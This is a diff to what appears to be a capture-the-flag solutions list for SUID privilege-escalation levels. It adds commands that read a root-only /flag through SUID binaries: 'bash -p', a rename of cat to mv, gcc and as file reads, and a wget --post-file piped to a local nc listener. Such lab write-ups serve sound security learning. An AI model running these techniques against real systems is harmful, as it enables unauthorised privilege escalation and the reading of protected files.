@@ -425,9 +425,11 @@
 
 22. `echo "/flag" | cpio -ov > flag.cpio && cat flag.cpio`
 
-23. `genisoimage -sort /flag -o - /flag` **EXTREMELY HARD**
-    Related explain in confusing numbers.
-
+23. **EXTREMELY HARD** `genisoimage -sort /flag -o - /flag`
+    
+- `genisoimage --help 2>&1 | grep FILE`
+    - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
+    
 24. `env -i cat /flag`
 
 25. `find / -maxdepth 1 -name flag -exec cat {} \;`
@@ -464,7 +466,12 @@
 
 39. `cp -v --no-preserve=all /flag ./flag && cat ./flag && rm -rf ./flag`
 
-40. `placeholder`
+40. **HARD** `/challenge/babysuid_level40 && mv /usr/bin/cat /usr/bin/mv && /challenge/babysuid_level40 && mv /flag`
+
+    - This level's solution is pretty tricky
+    - The level said it had set the `suid` for `mv` after we executed it. So remember, it set the `suid` just for a program called `mv`. `mv` is just a name, no matter what it is in its core logic. That is saying we can replace it with others.
+    - Here we just rename `cat` to `mv`, and covered the original `mv` program, then execute level program to get the `suid` privilege for present `mv` program (However, in core logic, it's `cat` program)
+    - Finally, 'cat' it, but our command should be `mv /flag`
 
 41. `perl -e 'open(FILE,"</flag");$line=<FILE>;foreach ($line){print $_;}'`
 
@@ -472,7 +479,13 @@
 
 43. `echo 'puts File.read("/flag")' > test.rb && /usr/bin/ruby test.rb && rm -rf test.rb`
 
-44. `placeholder`
+44. ```bash
+    bash -p
+    cat /flag
+    ```
+    
+    - **HARD**
+    - Recommend source: [bash suid](https://gtfobins.github.io/gtfobins/bash/#suid)
 
 45. `date -f /flag`
 
@@ -480,16 +493,17 @@
 
 47. `wc --files0-from=/flag`
 
-48. `placeholder`
+48. **HARD** `gcc -x assembler /flag`
 
 49. `as @/flag`
 
-50. 
+50. **HARD** `wget -bv --post-file=/flag 127.0.0.1:3864 | nc -vl 127.0.0.1 3864`
+
+    - DO NOT use the `-i` option, it turns all the `flag` letters to lowercase because of the `url` encoding rule.
+
+51. 
 
 ### Confusing Question Numbers
 
 - 17
 - **20** ( really confused )
-- 23
-  - `genisoimage --help 2>&1 | grep FILE`
-  - [https://www.youtube.com/watch?v=14mIjpOXnrM&t=733](https://www.youtube.com/watch?v=14mIjpOXnrM&t=733)
